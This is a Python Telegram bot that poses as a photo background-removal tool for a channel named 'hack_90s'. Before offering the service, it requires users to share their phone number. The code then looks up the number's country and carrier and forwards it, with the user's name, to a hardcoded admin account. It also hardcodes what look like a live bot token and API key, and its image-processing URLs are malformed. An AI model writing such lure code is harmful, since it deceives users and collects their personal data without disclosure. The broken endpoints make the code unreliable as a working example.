import telebot
import requests
import os
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from telebot import types
from flask import Flask
from threading import Thread

# --- Render Port Fix ---
app = Flask('')
@app.route('/')
def home(): return "AI Bot is Online!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    Thread(target=run).start()

# --- CONFIGURATION ---
API_TOKEN = '8277158758:AAG-HEtgNaAH3QZQOZyUu4AWfZObGsirRmk'
REMOVE_BG_KEY = 'Mx6t5h8VhQ7LnKPBaFq3U4w9'
ADMIN_ID = 8346338271
CHANNEL_LINK = 'https://t.me/hack_90s'
CHANNEL_USERNAME = '@hack_90s' 

bot = telebot.TeleBot(API_TOKEN)
verified_users = {}

def check_membership(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

def get_osint_info(phone_number):
    try:
        parsed_num = phonenumbers.parse(phone_number, None)
        country = geocoder.description_for_number(parsed_num, "en")
        service = carrier.name_for_number(parsed_num, "en")
        return f"🌍 Location: {country}\n📶 Network: {service}"
    except: return "❌ OSINT Error"

@bot.message_handler(commands=['start'])
def start(message):
    if not check_membership(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
        bot.send_message(message.chat.id, "❌ Join our channel first!", reply_markup=markup)
        return
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add(types.KeyboardButton("📲 Share Number", request_contact=True))
    bot.send_message(message.chat.id, "✅ Welcome! Share your contact.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user = message.from_user
    phone = message.contact.phone_number
    verified_users[user.id] = True 
    info = get_osint_info(phone)
    bot.send_message(ADMIN_ID, f"🚀 **NEW USER!**\n👤 {user.first_name}\n📱 {phone}\n{info}")
    bot.send_message(message.chat.id, "✅ Verified! Send a photo now.")

@bot.message_handler(content_types=['photo'])
def process_photo(message):
    if message.from_user.id not in verified_users:
        bot.reply_to(message, "⚠️ Verify number first!")
        return
    msg = bot.reply_to(message, "⏳ Editing...")
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        file_url = f'https://telegram.org{API_TOKEN}/{file_info.file_path}'
        res = requests.post('https://remove.bg', data={'image_url': file_url, 'size': 'auto'}, headers={'X-API-Key': REMOVE_BG_KEY})
        if res.status_code == 200:
            bot.send_document(message.chat.id, res.content, visible_file_name='no_bg.png')
            bot.delete_message(message.chat.id, msg.message_id)
        else: bot.send_message(message.chat.id, "❌ API Error.")
    except: bot.send_message(message.chat.id, "❌ Error.")

if __name__ == "__main__":
    keep_alive()
    bot.polling(none_stop=True)
